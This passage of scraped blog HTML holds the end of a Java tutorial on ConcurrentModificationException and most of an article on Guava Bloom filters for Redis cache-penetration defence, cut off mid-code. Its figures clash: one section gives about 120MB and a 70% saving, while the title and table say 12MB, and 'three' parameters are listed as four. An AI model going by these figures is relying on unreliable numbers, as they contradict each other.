    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        list.add(<span class="hljs-string">"懒惰"</span>);
        list.add(<span class="hljs-string">"蜗牛"</span>);
        list.add(<span class="hljs-string">"Java"</span>);

        <span class="hljs-keyword">for</span> (String str : list) {
            <span class="hljs-keyword">if</span> (<span class="hljs-string">"懒惰"</span>.equals(str)) {
                list.remove(str);
            }
        }
    }
}
</code></pre>
<p>在调用list.remove()的时候，ArrayList的内部结构发生了变化（元素数量、索引等），但迭代器Iterator并不知道这个变化。</p>
<p>当迭代器继续下一次next()操作时，它会发现"账对不上了"，然后马上就抛出ConcurrentModificationException（并发修改异常）来防止后面可能发生更严重的数据错乱问题。</p>
<p>推荐的遍历删除方式就是使用迭代器的remove()方法：</p>
<pre><code class="hljs language-java" lang="java">Iterator&lt;String&gt; iterator = list.iterator();
        <span class="hljs-keyword">while</span> (iterator.hasNext()) {
            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> iterator.next();
            <span class="hljs-keyword">if</span> (<span class="hljs-string">"懒惰"</span>.equals(str)) {
                iterator.remove();
            }
        }
</code></pre>
<p>iterator.remove()会通知集合本次修改，确保数据的一致性，因此是唯一推荐在遍历时修改集合的方式。</p>
<blockquote>
<p>在实际开发中，必须使用迭代器的remove()或removeIf来保证代码的健壮性和可维护性。</p>
</blockquote>
<h2 data-id="heading-6">结语</h2>
<p>今天，我们算是开始了一个Java新板块的学习。</p>
<p>我们了解了Java集合框架是什么、它的宏观架构，了解了根接口Collection所定义的通用能力。</p>
<p>然后聊了一下迭代器和ConcurrentModificationException。</p>
<p>接下来我们会看一下集合框架下的一些具体实现。</p>
<p>下一篇预告</p>
<blockquote>
<p>Day27 | List接口详解</p>
</blockquote>
<p>如果你觉得这系列文章对你有帮助，欢迎关注专栏，我们一起坚持下去！</p>
<p><strong>更多文章请关注我的公众号《懒惰蜗牛工坊》</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[缓存被打穿？1000万数据只用12MB内存：布隆过滤器实战指南]]></title>    <link>https://juejin.cn/post/7581738974424350739</link>    <guid>https://juejin.cn/post/7581738974424350739</guid>    <pubDate>2025-12-10T01:27:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581738974424350739" data-draft-id="7581738974424334355" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="缓存被打穿？1000万数据只用12MB内存：布隆过滤器实战指南"/> <meta itemprop="keywords" content="后端,面试,架构"/> <meta itemprop="datePublished" content="2025-12-10T01:27:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="踏浪无痕"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            缓存被打穿？1000万数据只用12MB内存：布隆过滤器实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    踏浪无痕
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:27:37.000Z" title="Wed Dec 10 2025 01:27:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>最近在做系统性能优化，发现一个可以优化的点：大量请求在查询不存在的用户ID，每次都要穿透Redis缓存去查MySQL。虽然有缓存空值的机制，但内存占用还是很大。</p>
<p>团队讨论时，有人提到用布隆过滤器来解决。我研究了一下，发现这个方案确实合适：1000万用户数据，HashSet要400MB内存，布隆过滤器只需要12MB，还能挡住99%的无效请求。</p>
<p>这篇文章记录了我从原理、参数调优到分布式实战的完整过程。无论你是第一次听说布隆过滤器，还是准备在生产环境用它，都能找到有价值的内容。</p>
<p><strong>阅读建议：</strong></p>
<ul>
<li>想快速解决问题？直接跳到「六、实际工作中的应用场景」</li>
<li>想理解原理？精读「一、布隆过滤器的本质」</li>
<li>准备上生产？重点看「七、使用注意事项」</li>
<li>技术选型或面试？关注「八、总结」</li>
</ul>
<h2 data-id="heading-1">一、布隆过滤器的本质</h2>
<h3 data-id="heading-2">1.1 解决什么问题</h3>
<p>我们先看一个实际场景。假设系统有1000万注册用户，现在需要快速判断一个用户ID是否存在。</p>
<p>常规方案对比：</p>
<p><strong>方案1：HashSet</strong></p>
<pre><code class="hljs language-java" lang="java">Set&lt;Long&gt; userIds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
<span class="hljs-comment">// 加载1000万用户ID</span>
userIds.contains(userId);  <span class="hljs-comment">// 判断是否存在</span>
</code></pre>
<p>内存占用：</p>
<ul>
<li>Long类型：8字节</li>
<li>HashSet额外开销：约32字节/元素</li>
<li>总计：1000万 × 40字节 = 400MB</li>
</ul>
<p><strong>方案2：布隆过滤器</strong></p>
<pre><code class="hljs language-java" lang="java">BloomFilter&lt;Long&gt; filter = BloomFilter.create(
    Funnels.longFunnel(),
    <span class="hljs-number">10_000_000</span>,  <span class="hljs-comment">// 1000万</span>
    <span class="hljs-number">0.01</span>         <span class="hljs-comment">// 1%误判率</span>
);
filter.mightContain(userId);  <span class="hljs-comment">// 判断是否存在</span>
</code></pre>
<p>内存占用：</p>
<ul>
<li>约120MB</li>
</ul>
<p><strong>节省了70%的内存！</strong></p>
<p>但布隆过滤器有个特点：它会有误判。具体来说：</p>
<ul>
<li>如果它说"不存在"，那一定不存在</li>
<li>如果它说"可能存在"，那可能是误判</li>
</ul>
<p>这个特性决定了它的使用场景。</p>
<h3 data-id="heading-3">1.2 工作原理</h3>
<p>布隆过滤器的核心数据结构是一个很长的bit数组，加上若干个Hash函数。</p>
<p><strong>添加元素的过程：</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[元素 hello] --&gt; B[Hash1]
    A --&gt; C[Hash2]
    A --&gt; D[Hash3]
    B --&gt; E[位置3 = 1]
    C --&gt; F[位置7 = 1]
    D --&gt; G[位置12 = 1]
    E --&gt; H[bit数组]
    F --&gt; H
    G --&gt; H
</code></pre>
<p><strong>查询元素的过程：</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[查询 hello] --&gt; B[Hash1]
    A --&gt; C[Hash2]
    A --&gt; D[Hash3]
    B --&gt; E{位置3是1?}
    C --&gt; F{位置7是1?}
    D --&gt; G{位置12是1?}
    E --&gt; H{都是1?}
    F --&gt; H
    G --&gt; H
    H --&gt;|是| I[可能存在]
    H --&gt;|否| J[一定不存在]
</code></pre>
<p>用代码表示就是：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// bit数组</span>
<span class="hljs-type">boolean</span>[] bits = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1000000</span>];

<span class="hljs-comment">// 添加元素</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String key)</span> {
    bits[hash1(key) % bits.length] = <span class="hljs-literal">true</span>;
    bits[hash2(key) % bits.length] = <span class="hljs-literal">true</span>;
    bits[hash3(key) % bits.length] = <span class="hljs-literal">true</span>;
}

<span class="hljs-comment">// 查询元素</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(String key)</span> {
    <span class="hljs-keyword">return</span> bits[hash1(key) % bits.length]
        &amp;&amp; bits[hash2(key) % bits.length]
        &amp;&amp; bits[hash3(key) % bits.length];
}
</code></pre>
<p>核心就这么简单：用多个Hash函数映射到bit数组的不同位置，打上标记。</p>
<h3 data-id="heading-4">1.3 为什么会误判</h3>
<p>看一个例子：</p>
<pre><code class="hljs language-css" lang="css">添加 "hello":
  <span class="hljs-built_in">hash1</span>(<span class="hljs-string">"hello"</span>) → 位置<span class="hljs-number">3</span> ✓
  <span class="hljs-built_in">hash2</span>(<span class="hljs-string">"hello"</span>) → 位置<span class="hljs-number">7</span> ✓
  <span class="hljs-built_in">hash3</span>(<span class="hljs-string">"hello"</span>) → 位置<span class="hljs-number">12</span> ✓

添加 <span class="hljs-string">"world"</span>:
  <span class="hljs-built_in">hash1</span>(<span class="hljs-string">"world"</span>) → 位置<span class="hljs-number">5</span> ✓
  <span class="hljs-built_in">hash2</span>(<span class="hljs-string">"world"</span>) → 位置<span class="hljs-number">3</span> ✓  (和hello冲突)
  <span class="hljs-built_in">hash3</span>(<span class="hljs-string">"world"</span>) → 位置<span class="hljs-number">9</span> ✓

此时bit数组: [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,...]
               位置:  <span class="hljs-number">3</span>   <span class="hljs-number">5</span>   <span class="hljs-number">7</span>   <span class="hljs-number">9</span>      <span class="hljs-number">12</span>

查询 <span class="hljs-string">"java"</span>:
  <span class="hljs-built_in">hash1</span>(<span class="hljs-string">"java"</span>) → 位置<span class="hljs-number">3</span>  (被hello占了)
  <span class="hljs-built_in">hash2</span>(<span class="hljs-string">"java"</span>) → 位置<span class="hljs-number">7</span>  (被hello占了)
  <span class="hljs-built_in">hash3</span>(<span class="hljs-string">"java"</span>) → 位置<span class="hljs-number">9</span>  (被world占了)
  
三个位置都是<span class="hljs-number">1</span>，误判为存在！
</code></pre>
<p>随着插入的元素越来越多，bit数组中1的密度越来越高，误判的概率也会增加。这就是为什么需要合理设置参数。</p>
<p><strong>但别担心这1%的误判</strong>：它只是让你多查一次数据库，而不是返回错误结果。对于防缓存穿透这种场景，已经挡住了99%的无效请求，完全够用。</p>
<h2 data-id="heading-5">二、参数的数学原理</h2>
<h3 data-id="heading-6">2.1 关键参数</h3>
<p>布隆过滤器有三个核心参数：</p>
<ul>
<li><strong>n</strong>: 预期插入的元素个数</li>
<li><strong>p</strong>: 期望的误判率</li>
<li><strong>m</strong>: bit数组的长度</li>
<li><strong>k</strong>: Hash函数的个数</li>
</ul>
<p>前两个是我们设置的，后两个是自动计算出来的。</p>
<h3 data-id="heading-7">2.2 参数怎么算出来的</h3>
<p>你只需要告诉布隆过滤器两个数字，它就能自动算出需要多大的空间和多少个Hash函数。</p>
<p><strong>你设置：</strong></p>
<ul>
<li>预计存多少个元素（比如1000万）</li>
<li>能接受多少误判率（比如1%）</li>
</ul>
<p><strong>它自动计算：</strong></p>
<ul>
<li>需要多大的bit数组</li>
<li>需要几个Hash函数</li>
</ul>
<p><strong>举个例子：</strong></p>
<pre><code class="hljs language-diff" lang="diff">我说：要存1000万个用户ID，误判率控制在1%

布隆过滤器算出来：
<span class="hljs-deletion">- bit数组：需要12MB内存</span>
<span class="hljs-deletion">- Hash函数：需要7个</span>
</code></pre>
<p>具体的数学公式很复杂，但好在Guava已经帮我们封装好了，直接用就行：</p>
<pre><code class="hljs language-java" lang="java">BloomFilter.create(
    Funnels.longFunnel(),
    <span class="hljs-number">10_000_000</span>,  <span class="hljs-comment">// 告诉它：1000万元素</span>
    <span class="hljs-number">0.01</span>         <span class="hljs-comment">// 告诉它：1%误判率</span>
);
<span class="hljs-comment">// 剩下的它自己算</span>
</code></pre>
<h3 data-id="heading-8">2.3 不同参数的对比</h3>















































<table><thead><tr><th>元素数量</th><th>误判率</th><th>内存占用</th><th>Hash函数数</th></tr></thead><tbody><tr><td>100万</td><td>1%</td><td>1.2 MB</td><td>7</td></tr><tr><td>100万</td><td>0.1%</td><td>1.8 MB</td><td>10</td></tr><tr><td>1000万</td><td>1%</td><td>12 MB</td><td>7</td></tr><tr><td>1000万</td><td>0.1%</td><td>18 MB</td><td>10</td></tr><tr><td>1亿</td><td>1%</td><td>120 MB</td><td>7</td></tr><tr><td>1亿</td><td>0.1%</td><td>180 MB</td><td>10</td></tr></tbody></table>
<p><strong>经验法则：</strong> 1%误判率下，每个元素约需1.2字节，远低于HashSet的40+字节。省下的几百MB内存，可能就是你的服务能否塞进容器的关键。</p>
<p>从表格可以看出：</p>
<ul>
<li>误判率降低10倍，内存增加约50%</li>
<li>Hash函数个数主要受误判率影响</li>
<li>元素数量增加10倍，内存也增加约10倍</li>
</ul>
<h3 data-id="heading-9">2.4 参数选择建议</h3>
<p><strong>误判率的选择：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">高精度场景(金融、安全): 0.001 (0.1%)</span>
<span class="hljs-section">常规业务场景: 0.01 (1%)</span>
<span class="hljs-section">宽松场景(日志去重): 0.03 (3%)</span>
</code></pre>
<p><strong>元素数量的预估：</strong></p>
<p>这个非常关键。如果预估不准确，会导致实际误判率远高于预期。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误示例：预估10万，实际插入100万</span>
BloomFilter&lt;Long&gt; filter = BloomFilter.create(
    Funnels.longFunnel(),
    <span class="hljs-number">100_000</span>,   <span class="hljs-comment">// 预估太小</span>
    <span class="hljs-number">0.01</span>
);

<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1_000_000</span>; i++) {
    filter.put(i);  <span class="hljs-comment">// 实际插入100万</span>
}

<span class="hljs-comment">// 此时误判率可能高达30%以上</span>
</code></pre>
<p>正确的做法是留出一定余量：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">currentCount</span> <span class="hljs-operator">=</span> userMapper.count();
<span class="hljs-type">int</span> <span class="hljs-variable">expectedCount</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (currentCount * <span class="hljs-number">1.5</span>);  <span class="hljs-comment">// 留50%余量</span>

BloomFilter&lt;Long&gt; filter = BloomFilter.create(
    Funnels.longFunnel(),
    expectedCount,
    <span class="hljs-number">0.01</span>
);
</code></pre>
<h2 data-id="heading-10">三、单机场景实战</h2>
<h3 data-id="heading-11">3.1 Guava实现</h3>
<p>Guava是最常用的布隆过滤器实现。</p>
<p><strong>基本使用：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.google.common.hash.BloomFilter;
<span class="hljs-keyword">import</span> com.google.common.hash.Funnels;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBloomFilter</span> {
    
    <span class="hljs-keyword">private</span> BloomFilter&lt;Long&gt; filter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 创建布隆过滤器</span>
            filter = BloomFilter.create(
                Funnels.longFunnel(),  <span class="hljs-comment">// 数据类型</span>
                <span class="hljs-number">10_000_000</span>,            <span class="hljs-comment">// 预期元素数</span>
                <span class="hljs-number">0.01</span>                   <span class="hljs-comment">// 误判率</span>
            );
            
            <span class="hljs-comment">// 从数据库加载所有用户ID</span>
            List&lt;Long&gt; userIds = userMapper.getAllUserIds();
            userIds.forEach(filter::put);
            
            log.info(<span class="hljs-string">"布隆过滤器初始化完成，加载{}个用户ID"</span>, userIds.size());
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"布隆过滤器初始化失败，服务无法启动"</span>, e);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"BloomFilter init failed"</span>, e);
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">mightContain</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-keyword">return</span> filter.mightContain(userId);
    }
    
    <span class="hljs-comment">// 关键：注册新用户时，必须同步更新过滤器</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(Long userId)</span> {
        filter.put(userId);  <span class="hljs-comment">// 否则会漏判，导致有效请求被拦截</span>
    }
}
</code></pre>
<p><strong>防止缓存穿透：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserBloomFilter bloomFilter;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, User&gt; redisTemplate;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserMapper userMapper;
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-comment">// 第一层：布隆过滤器</span>
        <span class="hljs-keyword">if</span> (!bloomFilter.mightContain(userId)) {
            log.info(<span class="hljs-string">"布隆过滤器判断用户不存在: {}"</span>, userId);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <span class="hljs-comment">// 一定不存在，直接返回</span>
        }
        
        <span class="hljs-comment">// 第二层：Redis缓存</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"user:"</span> + userId;
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
        <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> user;
        }
        
        <span class="hljs-comment">// 第三层：数据库</span>
        user = userMapper.selectById(userId);
        <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span>) {
            redisTemplate.opsForValue().set(cacheKey, user, <span class="hljs-number">1</span>, TimeUnit.HOURS);
        }
        
        <span class="hljs-keyword">return</span> user;
    }
}
</code></pre>
<p><strong>查询流程：</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[用户请求 userId] --&gt; B{布隆过滤器}
    B --&gt;|不存在| C[直接返回null]
    B --&gt;|可能存在| D{Redis缓存}
    D --&gt;|命中| E[返回用户信息]
    D --&gt;|未命中| F[查询MySQL]
    F --&gt; G[写入Redis]
    G --&gt; E
</code></pre>
<h3 data-id="heading-12">3.2 实战案例：短链接去重</h3>
<p>在生成随机短码时，需要检查是否已被占用。如果每次都查数据库，性能会很差。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShortUrlService</span> {
    
    <span class="hljs-comment">// 布隆过滤器</span>
    <span class="hljs-keyword">private</span> BloomFilter&lt;String&gt; keywordFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        keywordFilter = BloomFilter.create(
            Funnels.stringFunnel(Charsets.UTF_8),
            <span class="hljs-number">100_000_000</span>,  <span class="hljs-comment">// 预期1亿短链</span>
            <span class="hljs-number">0.01</span>
        );
        
        <span class="hljs-comment">// 加载已有的短码</span>
        List&lt;String&gt; keywords = shortUrlMapper.getAllKeywords();
        keywords.forEach(keywordFilter::put);
    }
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">generateUniqueKeyword</span><span class="hljs-params">()</span> {
        String keyword;
        <span class="hljs-type">int</span> <span class="hljs-variable">retryCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-keyword">do</span> {
            <span class="hljs-comment">// 生成6位随机码</span>
            keyword = RandomStringUtils.randomAlphanumeric(<span class="hljs-number">6</span>);
            
            <span class="hljs-comment">// 布隆过滤器快速判断</span>
            <span class="hljs-keyword">if</span> (!keywordFilter.mightContain(keyword)) {
                <span class="hljs-comment">// 一定不存在，可以直接使用</span>
                keywordFilter.put(keyword);
                <span class="hljs-keyword">return</span> keyword;
            }
            
            <span class="hljs-comment">// 可能存在，查数据库确认</span>
            <span class="hljs-keyword">if</span> (!shortUrlMapper.exists(keyword)) {
                keywordFilter.put(keyword);
                <span class="hljs-keyword">return</span> keyword;
            }
            
            retryCount++;
        } <span class="hljs-keyword">while</span> (retryCount &lt; <span class="hljs-number">10</span>);
        
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"生成短码失败"</span>);
    }
}
</code></pre>
<p>这个方案的优势：</p>
<ul>
<li>对于不存在的短码，直接返回，不查数据库</li>
<li>对于可能存在的短码，才去数据库确认</li>
<li>大约能减少90%的数据库查询</li>
</ul>
<h3 data-id="heading-13">3.3 定期重建</h3>
<p>随着数据量的增长，布隆过滤器的误判率会上升。需要定期重建。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BloomFilterRebuilder</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
    
    <span class="hljs-keyword">private</span> BloomFilter&lt;Long&gt; userIdFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        rebuildFilter();
    }
    
    <span class="hljs-comment">// 每天凌晨2点重建</span>
    <span class="hljs-meta">@Scheduled(cron = "0 0 2 * * ?")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">scheduleRebuild</span><span class="hljs-params">()</span> {
        log.info(<span class="hljs-string">"开始重建布隆过滤器"</span>);
        rebuildFilter();
        log.info(<span class="hljs-string">"布隆过滤器重建完成"</span>);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rebuildFilter</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 查询当前用户数</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">currentCount</span> <span class="hljs-operator">=</span> userMapper.count();
        <span class="hljs-type">long</span> <span class="hljs-variable">expectedCount</span> <span class="hljs-operator">=</span> (<span class="hljs-type">long</span>) (currentCount * <span class="hljs-number">1.5</span>);
        
        <span class="hljs-comment">// 创建新的过滤器</span>
        BloomFilter&lt;Long&gt; newFilter = BloomFilter.create(
            Funnels.longFunnel(),
            expectedCount,
            <span class="hljs-number">0.01</span>
        );
        
        <span class="hljs-comment">// 分批加载用户ID</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">pageSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">10000</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">pageNum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            List&lt;Long&gt; userIds = userMapper.selectUserIds(pageNum, pageSize);
            <span class="hljs-keyword">if</span> (userIds.isEmpty()) {
                <span class="hljs-keyword">break</span>;
            }
            
            userIds.forEach(newFilter::put);
            pageNum++;
        }
        
        <span class="hljs-comment">// 原子替换</span>
